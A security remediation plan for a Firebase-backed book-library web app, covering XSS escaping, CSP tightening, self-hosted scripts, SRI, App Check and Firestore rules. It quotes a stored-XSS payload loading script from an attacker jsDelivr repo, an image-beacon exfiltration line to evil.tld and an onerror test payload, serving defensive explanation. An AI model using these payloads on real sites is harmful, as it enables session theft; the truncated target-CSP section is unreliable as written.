# Migration to Maximum Security — Full Remediation Document

**Before we start: "100% secure" is not achievable.** Any claim to the contrary is marketing, not engineering. A web app runs on a browser the user controls, over a network you don't own, using libraries written by strangers, against a Firebase project whose rules you maintain by hand. Every one of those is a potential failure point.

What *is* achievable is **defense in depth to the point where any single failure is not catastrophic**. That's what this document delivers.

**Current rating:** 79/100
**Target rating:** 92–94/100 (the practical ceiling for a client-only PWA)
**Estimated total effort:** ~6 hours of focused work, spread over 4 phases

## Part 2 — Phase 1: Today (30 minutes)

The three fixes that matter most. Do all three before you close this tab.

### F-01 — Escape genre strings in `renderGenres()`

**Where:** `openManualEntry()`, inside `index.html`.

**Current code:**

```js
const renderGenres = () => {
    const container = document.getElementById('genres-badge-container');
    if (container) {
        container.innerHTML = currentGenres.map((g, i) => `
        <span class="...">
            ${g}
            <button data-genre-index="${i}" class="genre-remove-btn ...">&times;</button>
        </span>
        `).join('');
    }

    const selectContainer = document.getElementById('genres-multiselect-container');
    if (selectContainer) {
        selectContainer.innerHTML = POPULAR_GENRES.map(g => {
            const isActive = currentGenres.includes(g);
            return `
            <button type="button" data-genre-pill="${g}" ...>
                ${g}
            </button>
            `;
        }).join('');
    }
};
```

**Replace with:**

```js
const renderGenres = () => {
    const container = document.getElementById('genres-badge-container');
    if (container) {
        container.innerHTML = currentGenres.map((g, i) => {
            const safeG = escapeHTML(g);
            return `
            <span class="...">
                ${safeG}
                <button data-genre-index="${i}" class="genre-remove-btn ...">&times;</button>
            </span>
            `;
        }).join('');
    }

    const selectContainer = document.getElementById('genres-multiselect-container');
    if (selectContainer) {
        selectContainer.innerHTML = POPULAR_GENRES.map(g => {
            const isActive = currentGenres.includes(g);
            const safeG = escapeHTML(g);
            return `
            <button type="button" data-genre-pill="${safeG}" ...>
                ${safeG}
            </button>
            `;
        }).join('');
    }
};
```

**Why this matters:** this is the last stored-XSS primitive in the codebase. A collaborator with `allowAddBooks` can inject a book with `genres: ['<script src="https://cdn.jsdelivr.net/gh/attacker/x@main/p.js"></script>']` and detonate when the victim clicks Edit. `cdn.jsdelivr.net` is still in your `script-src`, so the payload loads even with the CSP in place. Fixing this closes the last injection path.

**Also apply this same fix to any other `.map()` in the codebase where a user-supplied string lands inside a template literal without `escapeHTML()`.** Do a full grep for `${g}` and `${author}` patterns to be safe. A useful diagnostic:

```cmd
findstr /C:"${g}" index.html
```

**Verify:**

1. Open DevTools console
2. Run: `window.__test_data.books[0]` to find a book
3. In Firestore console, edit a book's `genres` field to `["<img src=x onerror=alert(1)>"]`
4. Reload the app, click Edit on that book
5. **Before fix:** alert fires
6. **After fix:** the literal text is shown as a chip label

### F-04 — Narrow `img-src`

**Where:** the CSP `<meta>` tag in `<head>`.

**Current:**

```
img-src 'self' data: blob: https:;
```

**Replace with:**

```
img-src 'self' data: blob:
  https://covers.openlibrary.org
  https://books.google.com
  https://via.placeholder.com
  https://cdn-icons-png.flaticon.com
  https://www.gstatic.com;
```

**Why this matters:** `img-src https:` is an exfiltration channel. Any successful XSS — even a read-only one — can beacon data out via `new Image().src = 'https://evil.tld/?d=' + btoa(payload)`. Tightening this makes exfiltration require either a DNS-rebinding attack or a whitelisted origin compromise.

**Verify:** open DevTools → Console. Reload. All book covers from Open Library, Google Books, and the placeholder service should still render. Then run:

```js
document.body.innerHTML = '<img src="https://example.com/x.png">'
```

You should see a CSP violation blocking it.

### F-05 — Add `frame-ancestors 'none'`

**Where:** the same CSP `<meta>` tag.

**Add this line anywhere in the directive list:**

```
frame-ancestors 'none';
```

**Why this matters:** without it, an attacker can embed your app in an `<iframe>` on their page and overlay invisible buttons for clickjacking. Not currently exploitable for anything catastrophic (no "delete everything" button), but it's free to add and closes the door before you build more destructive features.

**Verify:** create a test HTML file:

```html
<iframe src="https://your-deployed-site.example/" width="800" height="600"></iframe>
```

Open it locally. The iframe should be refused with a CSP violation.

## Part 3 — Phase 2: This week (90 minutes)

### F-02 — Self-host the arbitrary-content CDNs

**Where:** the CSP `<meta>` tag, and all `<script src="...">` tags in `<head>`.

**Current `script-src` has four CDN origins that serve third-party code. Two of them — `unpkg.com` and `cdn.jsdelivr.net` — serve *arbitrary* attacker-controlled content.**

- `unpkg.com/<pkg>@<ver>/x.js` serves any npm package
- `cdn.jsdelivr.net/gh/<user>/<repo>@<ref>/x.js` serves any public GitHub repo

Any HTML-injection primitive that survives F-01 immediately becomes an XSS via these origins. Removing them turns every injection bug from "session compromise" into "broken layout."

**Step 1 — Download the five libraries:**

```cmd
mkdir vendor
curl -L https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js -o vendor\html5-qrcode.min.js
curl -L https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js -o vendor\confetti.min.js
curl -L https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js -o vendor\chart.umd.min.js
curl -L https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.4/purify.min.js -o vendor\purify.min.js
curl -L https://cdnjs.cloudflare.com/ajax/libs/PapaParse/5.4.1/papaparse.min.js -o vendor\papaparse.min.js
```

**Step 2 — Swap the `<script>` tags:**

```html
<!-- BEFORE -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.4/purify.min.js" referrerpolicy="no-referrer"></script>
<script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/PapaParse/5.4.1/papaparse.min.js" referrerpolicy="no-referrer"></script>
<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js" referrerpolicy="no-referrer"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js" referrerpolicy="no-referrer"></script>

<!-- AFTER -->
<script src="/vendor/purify.min.js" defer></script>
<script src="/vendor/html5-qrcode.min.js" defer></script>
<script src="/vendor/papaparse.min.js" defer></script>
<script src="/vendor/confetti.min.js" defer></script>
<script src="/vendor/chart.umd.min.js" defer></script>
```

**Step 3 — Remove the three origins from CSP:**

```
https://unpkg.com
https://cdn.jsdelivr.net
https://cdnjs.cloudflare.com
```

Note: `cdnjs.cloudflare.com` is *also* referenced in `style-src` for Font Awesome. You can keep it there if you keep using Font Awesome — the risk is much lower for CSS than for JS. Or self-host the CSS file too and remove it entirely.

**Step 4 — Add vendor to your deploy ignore list** so nothing local-only leaks:

Create or edit `firebase.json`:

```json
{
  "hosting": {
    "public": ".",
    "ignore": [
      "firebase.json",
      "**/.*",
      "**/node_modules/**",
      "**/*.bak",
      "**/*.bak2",
      "*.py",
      "*.txt",
      "src/**",
      "tools/**"
    ]
  }
}
```

**Verify:** after reload, `document.querySelectorAll('script[src]')` should show only same-origin URLs (`/vendor/*`, `/js/*`), plus `gstatic.com` for Firebase SDKs and `googletagmanager.com` for analytics. `unpkg.com`, `cdn.jsdelivr.net`, and `cdnjs.cloudflare.com` should not appear in `script-src`.

### F-03 — Add SRI to every remaining CDN script

**Where:** the `<script>` and `<link>` tags in `<head>` that still point at remote origins.

Only `gstatic.com` (Firebase SDKs) and `googletagmanager.com` (gtag) remain. Font Awesome CSS is on `cdnjs.cloudflare.com` — either keep it with SRI, or self-host.

**Step 1 — Compute SRI hashes:**

```cmd
curl -s https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js | openssl dgst -sha384 -binary | openssl base64 -A
```

Output will be a hash string. Prepend `sha384-`.

**Step 2 — Add integrity + crossorigin:**

```html
<script
  src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"
  integrity="sha384-<computed-hash>"
  crossorigin="anonymous"></script>
```

Repeat for:
- `firebase-auth-compat.js`
- `firebase-firestore-compat.js`
- Font Awesome CSS (via `<link integrity="..." crossorigin="anonymous">`)

**Step 3 — Firebase SRI hashes are published.** You don't have to compute them yourself — they're listed at `https://firebase.google.com/support/release-notes/js`. Copy them directly and update them whenever you bump the SDK version.

**Step 4 — Automated approach.** Rather than remembering to do this after every dependency bump, add a build step:

```bash
#!/usr/bin/env bash
# tools/sri.sh
set -euo pipefail
for url in $(grep -oP 'https://[^"]+\.(js|css)' index.html | sort -u); do
  hash=$(curl -s "$url" | openssl dgst -sha384 -binary | openssl base64 -A)
  printf '%s  sha384-%s\n' "$url" "$hash"
done
```

Run it after every update and paste the results.

**Verify:** temporarily corrupt one integrity hash. The script should be refused with a `Failed to find a valid digest` error in the Console. Restore it.

### F-06 — Enable Firebase App Check

**Why:** without App Check, an attacker with a Google account and a script can hammer your Firestore project. The rules limit *what* can be written; they don't stop the write volume or the account-creation cost.

**Step 1 — Console setup:**

1. Firebase Console → **App Check** → **Apps**
2. Register your web app with **reCAPTCHA v3**
3. Get a site key from https://www.google.com/recaptcha/admin
4. Paste it into the App Check registration
5. **Start in Unenforced mode.** Watch metrics for 24 hours. Then enforce.

**Step 2 — Add the SDK:**

```html
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-check-compat.js" integrity="sha384-..." crossorigin="anonymous"></script>
```

(Again, SRI hash from Firebase's release notes page.)

**Step 3 — Initialize before Firestore:**

In the Firebase init block, right after `firebase.initializeApp(firebaseConfig);`:

```js
const appCheck = firebase.appCheck();
appCheck.activate(
  '6Lc...your-recaptcha-v3-site-key...',
  true // auto-refresh
);
```

**Step 4 — Enforce in the console.** Firebase Console → App Check → Cloud Firestore → **Enforced**.

**Verify:** make a raw REST call to Firestore without an App Check token:

```cmd
curl "https://firestore.googleapis.com/v1/projects/mylib-5c855/databases/(default)/documents/books?key=<your-api-key>"
```

Expected: `403` with `App Check token is invalid`.

## Part 4 — Phase 3: This month (3 hours)

### F-07 — Validate `userName` in reviews and comments

**Where:** `rules_version = '2';.txt`.

**Current `validReviewContent()`:**

```javascript
function validReviewContent(d) {
  return d.category in ['Help', 'Review', 'Others']
    && d.body is string
    && d.body.size() >= 10
    && d.body.size() <= 2000
    && (!('rating' in d) || d.rating == null || ...);
}
```

**Add a check** so the `userName` on the review must match the writer's actual profile:

```javascript
&& d.userName is string
&& d.userName.size() > 0
&& d.userName.size() <= 100
```

And in the create rule:

```javascript
allow create: if isSignedIn()
  && request.resource.data.userId == request.auth.uid
  && validReviewContent(request.resource.data)
  && request.resource.data.userName ==
       get(/databases/$(database)/documents/users/$(request.auth.uid)).data.get('displayName', '')
  && request.resource.data.get('likesCount', 0) == 0
  && request.resource.data.get('commentsCount', 0) == 0;
```

Do the same for the `comments` subcollection create rule.

**Alternative (cheaper):** don't denormalize `userName` at all. Store only `userId` on the review, and have `renderReviewCard()` render `userProfileCache[rev.userId].displayName`. This avoids the `get()` cost and is arguably cleaner. It requires a small change in `renderReviewCard()`.

### F-08 — Constrain list queries

**Where:** `rules_version = '2';.txt`.

**Current:**

```javascript
match /users/{userId} {
  allow read: if isSignedIn();
}

match /userLookup/{email} {
  allow read: if isSignedIn();
}
```

Both rules cover `get` **and** `list`. That means any signed-in user can enumerate every UID in the system and every email → UID mapping.

**Split them:**

```javascript
match /userLookup/{email} {
  allow get: if isSignedIn();
  allow list: if isSignedIn()
    && request.query.limit <= 1
    && request.query.filters.size() == 1;
  // ...existing create/update rules...
}

match /users/{userId} {
  allow get: if isSignedIn();
  allow list: if isSignedIn();
  // ...existing create/update rules...
}
```

For `users`, you still need `list` in some places (fetching collaborator profiles), so a full lockdown would break the app. But at minimum, restrict `userLookup` — the app only ever calls `db.collection('userLookup').doc(email).get()`, so a `get`-only rule works.

### F-09 — Protect `commentsCount`

**Where:** `rules_version = '2';.txt`, `reviews` match block.

The rules currently permit:

```javascript
(request.resource.data.diff(resource.data).affectedKeys().hasOnly(['commentsCount'])
 && request.resource.data.get('commentsCount', 0) == resource.data.get('commentsCount', 0) + 1)
```

Anyone can increment any review's comment count without posting a comment. The rules comment admits this — the language can't reference a batch-generated comment doc ID.

**Fix:** require the write to happen in the same batch as a new comment. You can't reference the *generated* ID, but you can require *some* comment was created:

```javascript
// Requires that a comment document was added in the same batch
// (Firestore rules don't support this directly — this is a workaround)
```

Actually, this specific attack is hard to close in Firestore rules alone. The pragmatic fix is:

**Option A** — accept the cosmetic risk. Comment counts being off by a few is not a security issue.
**Option B** — denormalize: don't store `commentsCount` on the parent review at all. Compute it client-side by counting the comments subcollection. One extra read per review in the feed, but eliminates the forgeable field.

Option B is cleaner. In `renderReviewCard()`:

```js
// Replace `rev.commentsCount || 0` with a live count fetched during feed load
```

### F-10 — Externalize inline scripts, remove the static nonce

**Where:** `index.html`, `<head>` and `<body>`.

There are 5 inline `<script>` blocks:

| Location | Content | New file |
|----------|---------|----------|
| `<head>` (top) | Theme-flash prevention | `/js/theme-init.js` |
| `<head>` (after gtag) | gtag init | `/js/gtag-init.js` |
| `<head>` (after Tailwind) | `tailwind.config = {...}` | **Removed entirely** — see F-11 |
| `<body>` (after Firebase init) | Firebase config + persistence | `/js/firebase-init.js` |
| `<body>` (bottom) | Entire app | `/js/app.js` |

For each one, cut the script body (dropping `<script>` tags and `nonce=` attribute), paste into a new `.js` file, and reference it via `<script src="/js/foo.js" defer></script>`.

**After all 5 are external,** remove from CSP:

```
'nonce-mylib2026static'
```

**Why this matters:** the nonce is a static string. It's not protecting anything — an attacker who can inject HTML can read the nonce out of the page. Removing it and going to `script-src 'self' https://trusted-cdns` is the correct long-term posture.

**Verify:**

```js
document.querySelectorAll('script:not([src])').length
```

Should return `0`.

### F-11 — Compile Tailwind at build time

**Where:** `<head>`.

`cdn.tailwindcss.com` is explicitly documented as not for production. It ships a JIT compiler to every client (~100 KB), compiles at runtime, and cannot be SRI-pinned.

**Setup:**

```cmd
npm install -D tailwindcss
npx tailwindcss init
```

**Move `tailwind.config = {...}` into `tailwind.config.js`:**

```js
module.exports = {
  content: ['./index.html', './js/**/*.js'],
  darkMode: 'class',
  theme: {
    extend: {
      colors: {
        primary: 'var(--primary-color)',
        // ...paste the rest of the config here
      },
      // ...
    }
  },
  plugins: [
    function ({ addVariant }) {
      addVariant('sepia', '.sepia &');
    }
  ]
};
```

**Move the `<style>` block contents into `src/input.css`:**

```css
@tailwind base;
@tailwind components;
@tailwind utilities;

/* ...paste everything from your existing <style> tag here... */
```

**Build:**

```cmd
npx tailwindcss -i ./src/input.css -o ./dist/output.css --minify
```

**Replace in `index.html`:**

```html
<!-- Remove -->
<script src="https://cdn.tailwindcss.com" referrerpolicy="no-referrer"></script>
<script nonce="...">tailwind.config = {...};</script>
<style>...</style>

<!-- Add -->
<link rel="stylesheet" href="/dist/output.css">
```

**Remove from CSP:**

```
https://cdn.tailwindcss.com
```

And once no inline `<style>` remains, `style-src` can lose `'unsafe-inline'`:

```
style-src 'self' https://fonts.googleapis.com;
```

**Build step in CI:** every deploy should run `npx tailwindcss -i ./src/input.css -o ./dist/output.css --minify` before uploading. Otherwise `dist/output.css` goes stale.

### F-13 — Reconcile `readingStatus` reads

**Where:** `openBookDetails()` and `searchUserByEmail()`.

Both try to read the whole `books/{id}/readingStatus` subcollection. The rules only permit reading your own status doc, so these queries fail silently. The collaborator-review feature is currently non-functional.

**Two options:**

**Option A (simple):** remove the collaborator-review block from `openBookDetails()` and the per-book status fetch in `searchUserByEmail()`. Accept that users only see their own reviews.

**Option B (feature-restoring):** create a mirrored `publicReviews` subcollection:

```javascript
match /books/{bookId}/publicReviews/{reviewerUid} {
  allow read: if isSignedIn();
  allow create, update: if isSignedIn()
    && reviewerUid == request.auth.uid
    && request.resource.data.userId == request.auth.uid
    && validReviewContent(request.resource.data);
  allow delete: if isSignedIn() && reviewerUid == request.auth.uid;
}
```

Client writes to both `readingStatus` and `publicReviews` when saving a review. `openBookDetails()` queries `publicReviews`.

Pick Option A for now, Option B when you're ready to invest.

## Part 5 — Phase 4: Architectural (ongoing)

These aren't bugs. They're the structural limitations of the client-only design. Fixing them requires backend code (Cloud Functions).

### F-12 — AI API keys in `sessionStorage`

Your app design is: user brings their own Gemini/Groq key, it's stored in `sessionStorage`, and calls go directly from the browser to the AI provider. Any successful XSS can read the key. `sessionStorage` is not a security boundary against code that runs in your origin.

**What you can do without a backend:**

- Move keys to `sessionStorage` only (already done)
- Clear keys on sign-out
- Warn users that their key is exposed to any script running on the origin

**What requires a backend:**

- A Cloud Function that proxies AI calls, keeping keys server-side
- Auth-scoped: the function checks the caller's Firebase ID token before forwarding

The backend proxy is the "correct" fix. It's out of scope for a client-only app.

### F-14 — Rate limiting

Nothing limits how many writes a user can make. A scripted client with a valid Google account can create 10,000 reviews in a minute.

**Fix:** Cloud Function that runs on `reviews/{id}` create, checks the caller's write count in the last hour, and rejects if over a threshold. Or: Firestore rules can't do this, so it has to be backend.

**Minimum viable:** rely on Firebase's built-in quotas and monitor your usage dashboard. Not a fix, but a safety net.

### F-15 — Security logging

You have no visibility into abuse. If an attacker weaponizes an XSS tomorrow, you won't know.

**Fix:** Cloud Function that logs every write to a `securityAudit` collection with structured metadata: `userId`, `action`, `targetId`, `timestamp`, `ipHash`. Retain for 30 days. Alert on anomalies.

Again, backend work. Not urgent for a personal project; important for a real product.

## Part 7 — Target CSP

After all phases, the CSP meta tag should look like this:

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
```

## Part 8 — What "100%" would actually require

If you want to know what a genuinely hardened version of this app would look like, here's the honest answer:

### A. Backend

A Cloud Function (or your own server) that:

1. **Proxies all AI calls** — keys never touch the browser
2. **Proxies all cross-user reads** — collaborator library access goes through a server function that verifies authorization server-side
3. **Rate-limits all writes** — per-user, per-hour thresholds
4. **Logs all auth-sensitive actions** — audit trail you can query
5. **Validates all user input server-side** — client-side rules remain as defense-in-depth, but the server is the source of truth

### B. Authentication

- Require email verification before any write
- Add 2FA (Firebase supports TOTP-based MFA)
- Session expiry (Firebase ID tokens expire after 1 hour by default; ID token refresh is 14 days — reduce to 8 hours for a security-sensitive app)

### C. Supply chain

- **Vendored dependencies** — every library under `/vendor/`, updated on a schedule, reviewed before each upgrade
- **SBOM** — Software Bill of Materials tracking every transitive dependency
- **Subresource Integrity** — every external resource hashed
- **No CDNs** — all assets served from your origin

### D. Content Security Policy

- **No `'unsafe-inline'` anywhere** — no `script-src`, no `style-src`
- **No static nonce** — server-generated, per-response
- **`Trusted Types`** — `require-trusted-types-for 'script';` forces all DOM sink assignments through a policy
- **`Strict-Transport-Security`** — HSTS with `preload`
- **`X-Content-Type-Options: nosniff`** — via HTTP headers
- **`Referrer-Policy: strict-origin-when-cross-origin`**

### E. Application

- **Trusted Types policies** for every innerHTML assignment
- **No `innerHTML` anywhere** — use `textContent` and `createElement`
- **CSP report-to** — every violation reported to a logging endpoint
- **Sandboxed third-party content** — if any

### F. Operational

- **Continuous monitoring** — Firebase alerts, Cloud Monitoring on write rates, anomaly detection
- **Incident response plan** — what to do when something goes wrong
- **Regular audits** — quarterly rule review, annual external audit
- **Dependency scanning** — `npm audit`, Dependabot, Snyk
- **Penetration testing** — before every major release

### G. The math

Every item above closes a *category* of risk. Doing all of them gets you to maybe **98/100** for this class of application. The remaining 2 points are:

- Zero-day browser exploits (you cannot defend against these)
- Malicious browser extensions with full page access (you cannot defend against these)
- Compromised user devices (you cannot defend against these)

**This is what "100% secure" actually means: not achievable, but the ceiling is high enough that no realistic attacker will bother with your app when easier targets exist.**
